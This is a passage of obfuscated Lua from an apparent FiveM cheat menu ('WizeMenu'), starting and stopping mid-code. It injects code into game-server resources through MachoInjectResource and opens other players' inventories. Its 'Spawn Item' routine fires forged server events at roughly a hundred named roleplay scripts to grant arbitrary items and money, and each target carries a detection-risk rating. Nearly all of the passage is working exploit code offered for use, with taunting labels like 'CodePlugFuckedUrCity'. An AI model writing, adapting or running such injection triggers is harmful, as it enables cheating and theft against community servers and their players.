                                            end

                                            if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                                TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                            end
                                            
                                            local ActiveInventory = "%s"
                                            local serverId = GetPlayerServerId(closestPlayer)
                                            if ActiveInventory == "ox" then
                                                TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
                                            elseif ActiveInventory == "qb" then
                                                TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                            end
                                        end
                                    end
                                end
                            end)
                        end

                        awt72q48dsgn()

                    ]]):format(v331));break;end end break;end if (v330==(0 + 0)) then v331=nil;v332={"ox_inventory","ox_doorlock","ox_fuel","ox_target","ox_lib","ox_sit","ox_appearance"};v330=1;end if (v330==(2 -1)) then v333={ox="ox_inventory",qb="qb-inventory"};for v408,v409 in pairs(v333) do if (GetResourceState(v409)=="started") then v331=v408;break;end end v330=2;end end else MachoInjectResource2(3,v234.resource,v234.code);end break;end if ((1684 -(1466 + 218))==v233) then v234=v67[v66];if  not v234 then return;end v233=1;end end end);ItemNameHandle=MachoMenuInputbox(v46[1],"Name:","...");ItemAmountHandle=MachoMenuInputbox(v46[1],"Amount:","...");local v68={turn=1 + 0 ,akIndex=1};local function v69(v235) MachoInjectResource("any",v235);end MachoMenuButton(v46[1],"Spawn Item",function() if  not v7() then return;end local v236=MachoMenuGetInputbox(ItemNameHandle);local v237=MachoMenuGetInputbox(ItemAmountHandle);if ( not v236 or (v236=="") or  not v237 or  not tonumber(v237)) then local v296=0;while true do if (v296==(1148 -(556 + 592))) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");return;end end end local v238=tonumber(v237);local v239={{id="ak_item",name="Any Item Trigger (SAFE)",type="item",res={"ak47_whitewidowv2","ak47_cannabiscafev2","ak47_khusland","ak47_khusbites","ak47_leafnlatte","ak47_qb_cannabiscafev2","ak47_qb_leafnlatte","ak47_qb_khusland","ak47_qb_khusbites","ak47_qb_whitewidowv2"},all=false},{id="nails_money",name="Money Trigger (SAFE)",type="money",res={"codewave-nails-phone"},all=true},{id="handbag_money",name="Money Trigger (SAFE)",type="money",res={"codewave-handbag-phone"},all=true},{id="sneaker_money",name="Money Trigger (SAFE)",type="money",res={"codewave-sneaker-phone"},all=true},{id="caps_money",name="Money Trigger (SAFE)",type="money",res={"codewave-caps-client-phone"},all=true},{id="generic_money",name="Any Item Trigger (Medium Risk)",type="item",res={"ak47_qb_drugmanagerv2","ak47_drugmanagerv2"},all=false},{id="hotdog_money",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=true},{id="ak47_inventory",name="Any Item Trigger (SAFE)",type="item",res={"ak47_inventory","ak47_qb_inventory"},all=false},{id="shop_purchase",name="Palm Beach ANY ITEM (SAFE)",type="item_only",res={"PalmBeachMiamiMinimap"},all=true},{id="cl_pizzeria",name="Any Item Trigger (Medium Risk)",type="item",res={"CL-Pizzeria"},all=false},{id="solstice_moonshine",name="Any Item Trigger (Medium Risk)",type="item",res={"SolsticeMoonshineV2"},all=false},{id="tk_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"Tk_smokev2"},all=false},{id="ox_cb_ws_sellshop",name="Any Item Trigger (High Risk)",type="item",res={"__ox_cb_ws_sellshop"},all=false},{id="adminplus_selldrugs",name="Any Event Trigger (High Risk)",type="event",res={"adminplus-selldrugs"},all=false},{id="ak47_drugmanager",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanager"},all=false},{id="ak47_drugmanagerv2",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanagerv2"},all=false},{id="ak47_prospecting_reward",name="Give Scrap Items (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak47_prospecting_sell",name="Money Trigger (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak4y_fishing del",name="Any Item Trigger (Medium Risk)",type="item",res={"ak4y-advancedFishing"},all=false},{id="ak4y_case_opening",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-caseOpening"},all=false},{id="ak4y_playtime_shop",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-playTimeShop"},all=false},{id="angelicxs_civilian_payment",name="Money Trigger (SAFE)",type="money",res={"angelicxs-civilianjobs"},all=false},{id="angelicxs_civilian_item",name="Any Item Trigger (SAFE)",type="item",res={"angelicxs-civilianjobs"},all=false},{id="apex_cluckinbell",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_cluckinbell"},all=false},{id="apex_rexdiner",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_rexdiner"},all=false},{id="ars_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_hunting"},all=false},{id="ars_vvsgrillz",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsgrillz_v2"},all=false},{id="ars_vvsguns",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsguns"},all=false},{id="ars_vvsjewelry",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsjewelry"},all=false},{id="ars_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_whitewidow_v2"},all=false},{id="av_business",name="Any Item Trigger (Medium Risk)",type="item",res={"av_business"},all=false},{id="boii_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-drugs"},all=false},{id="boii_moneylaunderer",name="Money Trigger (Medium Risk)",type="money",res={"boii-moneylaunderer"},all=false},{id="boii_pawnshop",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-pawnshop"},all=false},{id="boii_salvage_diving",name="Any Event Trigger (Medium Risk)",type="event",res={"boii-salavagediving"},all=false},{id="boii_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"boii_whitewidow"},all=false},{id="brutal_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_hunting"},all=false},{id="brutal_shop_robbery",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_shop_robbery"},all=false},{id="cfx_tcd_starter",name="Any Event Trigger (Medium Risk)",type="event",res={"cfx-tcd-starterpack"},all=false},{id="core_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"core_crafting"},all=false},{id="d3mba_heroin",name="Any Item Trigger (Medium Risk)",type="item",res={"d3MBA-heroin"},all=false},{id="dcweedroll",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedroll"},all=false},{id="dcweedrollnew",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedrollnew"},all=false},{id="devcore_needs",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_needs"},all=false},{id="devcore_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_smokev2"},all=false},{id="dusa_pets",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa-pets"},all=false},{id="dusa_pet_shop",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa_pet"},all=false},{id="dv_donut_delivery",name="Money Trigger (Medium Risk)",type="money",res={"dv-donutdeliveryjob"},all=false},{id="esx_weashop",name="Any Item Trigger (Medium Risk)",type="item",res={"esx_weashop"},all=false},{id="ez_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"ez_lib"},all=false},{id="fivecode_camping",name="Any Item Trigger (Medium Risk)",type="item",res={"fivecode_camping"},all=false},{id="food_mechanics",name="Any Item Trigger (Medium Risk)",type="item",res={"food_mechanics"},all=false},{id="forge_starter",name="Any Item Trigger (Medium Risk)",type="item",res={"forge-starter"},all=false},{id="fs_placeables",name="Any Item Trigger (Medium Risk)",type="item",res={"fs_placeables"},all=false},{id="fuksus_shops",name="Any Item Trigger (Medium Risk)",type="item",res={"fuksus-shops"},all=false},{id="gardener_job",name="Money Trigger (Medium Risk)",type="money",res={"gardenerjob"},all=false},{id="guatau_consumibles",name="Any Item Trigger (Medium Risk)",type="item",res={"guataubaconsumibles"},all=false},{id="hg_wheel",name="Any Item Trigger (Medium Risk)",type="item",res={"hg-wheel"},all=false},{id="horizon_payment",name="Any Item Trigger (Medium Risk)",type="item",res={"horizon_paymentsystem"},all=false},{id="complete_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"hunting"},all=false},{id="inside_fruitpicker",name="Money Trigger (Medium Risk)",type="money",res={"inside-fruitpicker"},all=false},{id="inverse_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"inverse-consumables"},all=false},{id="it_lib",name="Any Item Trigger (SAFE)",type="item",res={"it-lib"},all=false},{id="jg_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jg-mechanic"},all=false},{id="jim_bakery",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-bakery"},all=false},{id="jim_beanmachine",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-beanmachine"},all=false},{id="jim_burgershot",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-burgershot"},all=false},{id="jim_catcafe",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-catcafe"},all=false},{id="jim_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-consumables"},all=false},{id="jim_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mechanic"},all=false},{id="jim_mining",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mining"},all=false},{id="jim_pizzathis",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-pizzathis"},all=false},{id="jim_recycle",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-recycle"},all=false},{id="jim_shops_blackmarket",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="jim_shops_open",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="kaves_drugsv2",name="Any Item Trigger (Medium Risk)",type="item",res={"kaves_drugsv2"},all=false},{id="mt_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"mt-restaurants"},all=false},{id="mt_printers",name="Any Item Trigger (Medium Risk)",type="item",res={"mt_printers"},all=false},{id="nx_cayo",name="Any Item Trigger (Medium Risk)",type="item",res={"nx-cayo"},all=false},{id="okok_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"okokCrafting"},all=false},{id="pug_business_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-businesscreator"},all=false},{id="pug_chopping",name="Money Trigger (Medium Risk)",type="money",res={"pug-chopping"},all=false},{id="pug_fishing",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-fishing"},all=false},{id="pug_robbery_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-robberycreator"},all=false},{id="qb_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-crafting"},all=false},{id="qb_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-drugs"},all=false},{id="qb_garbage_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-garbagejob"},all=false},{id="qb_hotdog_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=false},{id="qb_recycle_job",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-recyclejob"},all=false},{id="qb_trash_search",name="Money Trigger (Medium Risk)",type="money",res={"qb-trashsearch"},all=false},{id="qb_warehouse",name="Money Trigger (Medium Risk)",type="money",res={"qb-warehouse"},all=false},{id="rm_camperv",name="Any Item Trigger (Medium Risk)",type="item",res={"rm_camperv"},all=false},{id="ry_rent",name="Money Trigger (Medium Risk)",type="money",res={"ry_rent"},all=false},{id="savana_trucker",name="Money Trigger (Medium Risk)",type="money",res={"savana-truckerjob"},all=false},{id="sayer_jukebox",name="Any Item Trigger (Medium Risk)",type="item",res={"sayer-jukebox"},all=false},{id="sell_usb",name="Any Event Trigger (Medium Risk)",type="event",res={"sell_usb"},all=false},{id="snipe_boombox",name="Any Item Trigger (Medium Risk)",type="item",res={"snipe-boombox"},all=false},{id="solos_cashier",name="Money Trigger (Medium Risk)",type="money",res={"solos-cashier"},all=false},{id="solos_food",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-food"},all=false},{id="solos_hookah",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-hookah"},all=false},{id="solos_jointroll",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-jointroll"},all=false},{id="solos_joints",name="Any Item Trigger (High Risk)",type="item",res={"solos-joints"},all=false},{id="solos_methlab",name="Any Item Trigger (High Risk)",type="item",res={"solos-methlab"},all=false},{id="solos_moneywash",name="Any Item Trigger (High Risk)",type="item",res={"solos-moneywash"},all=false},{id="solos_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-restaurants"},all=false},{id="t1ger_gangsystem",name="Any Item Trigger (High Risk)",type="item",res={"t1ger_gangsystem"},all=false},{id="t1ger_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"t1ger_lib"},all=false},{id="xmmx_letscookplus",name="Any Item Trigger (Medium Risk)",type="item",res={"xmmx_letscookplus"},all=false},{id="zat_farming",name="Any Item Trigger (Medium Risk)",type="item",res={"zat-farming"},all=false},{id="zat_weed",name="Any Item Trigger (High Risk)",type="item",res={"zat-weed"},all=false}};local v240=false;for v274,v275 in ipairs(v239) do local v276=false;if v275.all then local v302=0 -0 ;while true do if (v302==(0 -0)) then v276=true;for v387,v388 in ipairs(v275.res) do if  not v48(v388) then v276=false;break;end end break;end end else for v317,v318 in ipairs(v275.res) do if v48(v318) then v276=true;break;end end end if v276 then local v303=v236;local v304=v238;if ((v275.type=="money") or (v275.type=="event")) then v303="money";end if (v275.id=="ak_item") then for v370=v68.akIndex,( #v275.res + v68.akIndex) -(1964 -(556 + 1407))  do local v371=((v370-1)% #v275.res) + (1207 -(741 + 465)) ;local v372=v275.res[v371];if v48(v372) then v68.akIndex=(v371% #v275.res) + 1 ;local v402,v403,v404=table.unpack(GetEntityCoords(PlayerPedId()));local v405=([[Citizen.CreateThread(function() pcall(function() TriggerServerEvent(%q,%q,{['phone']=0},%d,0) end); DoScreenFadeOut(1);Citizen.Wait(1000);SetEntityCoordsNoOffset(PlayerPedId(),%f,%f,%f,false,false,false);Citizen.Wait(1000);DoScreenFadeIn(1000) end)]]):format(v372   .. ":process" ,v303,v304,v402,v403,v404);v69(v405);v240=true;break;end end elseif (v275.id=="nails_money") then local v389=465 -(170 + 295) ;while true do if ((0 + 0)==v389) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardnails",%d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="handbag_money") then local v410=0 + 0 ;while true do if (v410==(0 -0)) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardhandbags",%d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="sneaker_money") then local v426=0 + 0 ;while true do if (v426==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardShoes",%d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="caps_money") then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardCaps",%d) end)'):format(v304));v240=true;elseif (v275.id=="generic_money") then v69(("pcall(function() TriggerServerEvent('ak47_qb_drugmanagerv2:shop:buy', '53.15-1478.79', {['buyprice']=0, ['currency']='cash', ['name']='%s', ['sellprice']=0, ['label']='Katana MeNu On Top!!'}, %d) end)"):format(v303,v304));v240=true;elseif (v275.id=="hotdog_money") then local v435=0 + 0 ;while true do if (v435==0) then v69(("pcall(function() local ped=GetPlayerPed(-1) local pedCoords=GetEntityCoords(ped) local HotdogsForSale=1 local SellingPrice=%d TriggerServerEvent('qb-hotdogjob:server:Sell', pedCoords, HotdogsForSale, SellingPrice) end)"):format(v304));v240=true;break;end end elseif (v275.id=="ak47_inventory") then v69(([[TriggerServerEvent('ak47_inventory:buyItemDrag',{fromInv={identifier=nil,slot=1,slotData={amount=%d,close=true,count=999999999999999,description="CodePlug Found Ts Lol",info={account="cash",buyPrice=0},label="CodePlug Too Good Lol",name="%s",quality=100,slot=1,type="item",weight=0}},toInv={identifier=nil,slot=1,slotData={slot=1}}} )]]):format(v304,v303));v240=true;elseif (v275.id=="shop_purchase") then local v436=1230 -(957 + 273) ;local v437;while true do if (v436==(1 + 0)) then v240=true;break;end if (v436==(0 + 0)) then v437="codeplug"   .. math.random(1000,381040 -281041 ) ;v69(('pcall(function() TriggerServerEvent("shop:purchaseItem2", "%s", "%s", 0) end)'):format(v437,v303));v436=1;end end elseif (v275.id=="cl_pizzeria") then local v438=0;while true do if (v438==(0 -0)) then v69(('pcall(function() TriggerServerEvent("CL-Pizzeria:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solstice_moonshine") then local v439=0;while true do if (v439==0) then v69(('pcall(function() TriggerServerEvent("SolsticeMoonshineV2:server:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="tk_smokev2") then local v440=0 -0 ;while true do if (v440==(0 -0)) then v69(('pcall(function() TriggerServerEvent("Tk_smokev2:server:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="ox_cb_ws_sellshop") then local v441=1780 -(389 + 1391) ;while true do if (v441==0) then v69(('pcall(function() TriggerServerEvent("__ox_cb_ws_sellshop:sellItem", "sellshop", "ws_sellshop:sellItem:17692", { currency = "money", item = "%s", price = 9999999999, quantity = %d }) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="adminplus_selldrugs") then local v442=0;while true do if (v442==0) then v69(('pcall(function() TriggerEvent("stasiek_selldrugsv2:findClient",{ ["i"] = 8, ["label"] = "CodePlugFuckedUrCity", ["type"] = "CodePlugFuckedUrCity", ["zone"] = "The Meat Quarter", ["price"] = %d, ["count"] = 0 }) end)'):format(v304));v240=true;break;end end elseif (v275.id=="ak47_drugmanager") then local v443=0;while true do if ((0 + 0)==v443) then v69(('pcall(function() TriggerServerEvent("ak47_drugmanager:pickedupitem","%s","%s",%d) end)'):format(v303,v303,v304));v240=true;break;end end elseif (v275.id=="ak47_drugmanagerv2") then v69(('pcall(function() TriggerServerEvent("ak47_drugmanagerv2:shop:buy", "-1146.444941.22", { buyprice = 0, currency = "money", label = "codeplug", name = "%s", sellprice = 69696969 }, %d ) end)'):format(v303,v304));v240=true;elseif (v275.id=="ak47_prospecting_reward") then local v444=0 + 0 ;while true do if (v444==(0 -0)) then v69(('pcall(function() TriggerServerEvent("ak47_prospecting:reward", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="ak47_prospecting_sell") then local v445=951 -(783 + 168) ;while true do if (v445==(0 -0)) then v69(('pcall(function() TriggerServerEvent("ak47_prospecting:sell","cash",%d,9999999999) end)'):format(v304));v240=true;break;end end elseif (v275.id=="ak4y_fishing") then local v446=0 + 0 ;while true do if (v446==(311 -(309 + 2))) then v69(('pcall(function() TriggerServerEvent("ak4y-advancedFishing:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="ak4y_case_opening") then local v447=0 -0 ;while true do if (v447==0) then v69(('pcall(function() TriggerServerEvent("ak4y-caseOpening:addGoldCoin", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="ak4y_playtime_shop") then local v448=1212 -(1090 + 122) ;while true do if (v448==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("ak4y-playTimeShop:addCoin", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="angelicxs_civilian_payment") then v69(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:Payment", %d) end)'):format(v304));v240=true;elseif (v275.id=="angelicxs_civilian_item") then local v449=0 -0 ;while true do if (v449==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="apex_cluckinbell") then local v450=1118 -(628 + 490) ;while true do if ((0 + 0)==v450) then v69(('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="apex_rexdiner") then local v451=0 -0 ;while true do if (v451==0) then v69(('pcall(function() TriggerServerEvent("apex_rexdiner:client:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="ars_hunting") then local v452=0 -0 ;while true do if (v452==0) then v69(('pcall(function() TriggerServerEvent("ars_hunting:sellBuyItem", { item = "%s", price = 1, quantity = %d, buy = true }) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="ars_vvsgrillz") then local v453=0;while true do if ((774 -(431 + 343))==v453) then v69(('pcall(function() TriggerServerEvent("ars_vvsgrillz_v2:Buyitem", "grillz", { items = {{ id = "%s", quantity = %d, price = 0, stock = 999999, totalPrice = 0 }}, method = "bank", total = 0 }, "bank") end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="ars_vvsguns") then local v454=0 -0 ;while true do if (v454==(0 -0)) then v69(('pcall(function() TriggerServerEvent("ars_vvsguns:Buyitem", "vvsguns", { items = { { id = "%s", image = "codeplug", name = "codeplug", page = 2, price = 0, quantity = %d, stock = 9999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="ars_vvsjewelry") then v69(('pcall(function() TriggerServerEvent("ars_vvsjewelry:Buyitem", "vvsjewelry", { items = { { id = "%s", image = "CodePlug", name = "CodePlugRunsUrCity", page = 2, price = 0, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v303,v304));v240=true;elseif (v275.id=="ars_whitewidow") then local v455=0;while true do if (v455==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("ars_whitewidow_v2:Buyitem", { items = { { id = "%s", image = "CodeFinder", name = "CodeFinder", page = 1, price = 500, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash") end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="av_business") then v69(('pcall(function() TriggerServerEvent("av_business:addItem", "%s", %d, 9999) end)'):format(v303,v304));v240=true;elseif (v275.id=="boii_drugs") then local v456=0;while true do if ((0 + 0)==v456) then v69(('pcall(function() TriggerServerEvent("boii-drugs:sv:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="boii_moneylaunderer") then local v457=1695 -(556 + 1139) ;while true do if (v457==0) then v69(('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:PayPlayer", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="boii_pawnshop") then v69(('pcall(function() TriggerServerEvent("boii-pawnshop:sv:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="boii_salvage_diving") then local v458=15 -(6 + 9) ;while true do if (v458==0) then v69('pcall(function() TriggerServerEvent("boii-salavagediving:server:JewelleryBag") end)');v240=true;break;end end elseif (v275.id=="boii_whitewidow") then v69(('pcall(function() TriggerServerEvent("boii_whitewidow:server:itemadd", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="brutal_hunting") then local v459=0 + 0 ;while true do if (v459==0) then v69(('pcall(function() TriggerServerEvent("brutal_hunting:server:giveItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="brutal_shop_robbery") then local v460=0;while true do if (v460==0) then v69(('pcall(function() TriggerServerEvent("brutal_shop_robbery:server:giveItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="cfx_tcd_starter") then local v461=0 + 0 ;while true do if (0==v461) then v69('pcall(function() TriggerEvent("cfx-tcd-starterpack:client:openStarterPack") end)');v240=true;break;end end elseif (v275.id=="core_crafting") then v69(('pcall(function() TriggerServerEvent("core_crafting:giveItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="d3mba_heroin") then v69(('pcall(function() TriggerServerEvent("d3MBA-heroin:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="dcweedroll") then local v462=169 -(28 + 141) ;while true do if (v462==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("dcweedroll:server:itemadd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="dcweedrollnew") then local v463=0;while true do if (v463==(0 -0)) then v69(('pcall(function() TriggerServerEvent("dcweedrollnew:server:itemadd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="devcore_needs") then local v464=0;while true do if ((0 + 0)==v464) then v69(('pcall(function() TriggerServerEvent("devcore_needs:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="devcore_smokev2") then local v465=1317 -(486 + 831) ;while true do if (v465==(0 -0)) then v69(('pcall(function() TriggerServerEvent("devcore_smokev2:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="dusa_pets") then local v466=0 -0 ;while true do if (v466==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("dusa-pets:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="dusa_pet_shop") then v69(('pcall(function() TriggerServerEvent("dusa_pet:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="dv_donut_delivery") then v69(('pcall(function() TriggerServerEvent("dv-donutdeliveryjob:server:giveReward", %d) end)'):format(v304));v240=true;elseif (v275.id=="esx_weashop") then v69(('pcall(function() TriggerServerEvent("esx_weashop:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="ez_lib") then local v467=0 -0 ;while true do if (v467==(1263 -(668 + 595))) then v69(('pcall(function() TriggerServerEvent("ez_lib:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="fivecode_camping") then local v468=0 + 0 ;while true do if (v468==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("fivecode_camping:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="food_mechanics") then local v469=0 -0 ;while true do if (v469==(290 -(23 + 267))) then v69(('pcall(function() TriggerServerEvent("food_mechanics:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="forge_starter") then local v470=1944 -(1129 + 815) ;while true do if (v470==0) then v69(('pcall(function() TriggerServerEvent("forge-starter:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="fs_placeables") then local v471=0;while true do if (v471==(387 -(371 + 16))) then v69(('pcall(function() TriggerServerEvent("fs_placeables:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="fuksus_shops") then local v472=1750 -(1326 + 424) ;while true do if (v472==0) then v69(('pcall(function() TriggerServerEvent("fuksus-shops:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="gardener_job") then local v473=0 -0 ;while true do if (v473==(0 -0)) then v69(('pcall(function() TriggerServerEvent("gardenerjob:server:giveReward", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="guatau_consumibles") then local v474=118 -(88 + 30) ;while true do if (v474==0) then v69(('pcall(function() TriggerServerEvent("guataubaconsumibles:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="hg_wheel") then local v475=771 -(720 + 51) ;while true do if (v475==(0 -0)) then v69(('pcall(function() TriggerServerEvent("hg-wheel:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="horizon_payment") then v69(('pcall(function() TriggerServerEvent("horizon_paymentsystem:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="complete_hunting") then v69(('pcall(function() TriggerServerEvent("hunting:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="inside_fruitpicker") then local v476=1776 -(421 + 1355) ;while true do if (v476==(0 -0)) then v69(('pcall(function() TriggerServerEvent("inside-fruitpicker:server:giveReward", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="inverse_consumables") then local v477=0 + 0 ;while true do if (v477==(1083 -(286 + 797))) then v69(('pcall(function() TriggerServerEvent("inverse-consumables:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="it_lib") then v69(('pcall(function() TriggerServerEvent("it_lib:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="jg_mechanic") then local v478=0;while true do if (v478==(0 -0)) then v69(('pcall(function() TriggerServerEvent("jg-mechanic:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_bakery") then local v479=0 -0 ;while true do if (v479==0) then v69(('pcall(function() TriggerServerEvent("jim-bakery:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_beanmachine") then local v480=439 -(397 + 42) ;while true do if (v480==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("jim-beanmachine:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_burgershot") then local v481=800 -(24 + 776) ;while true do if (v481==0) then v69(('pcall(function() TriggerServerEvent("jim-burgershot:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_catcafe") then local v482=0;while true do if (v482==(0 -0)) then v69(('pcall(function() TriggerServerEvent("jim-catcafe:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_consumables") then v69(('pcall(function() TriggerServerEvent("jim-consumables:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="jim_mechanic") then local v483=785 -(222 + 563) ;while true do if (v483==0) then v69(('pcall(function() TriggerServerEvent("jim-mechanic:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_mining") then local v484=0 -0 ;while true do if (v484==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("jim-mining:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_pizzathis") then local v485=190 -(23 + 167) ;while true do if (v485==0) then v69(('pcall(function() 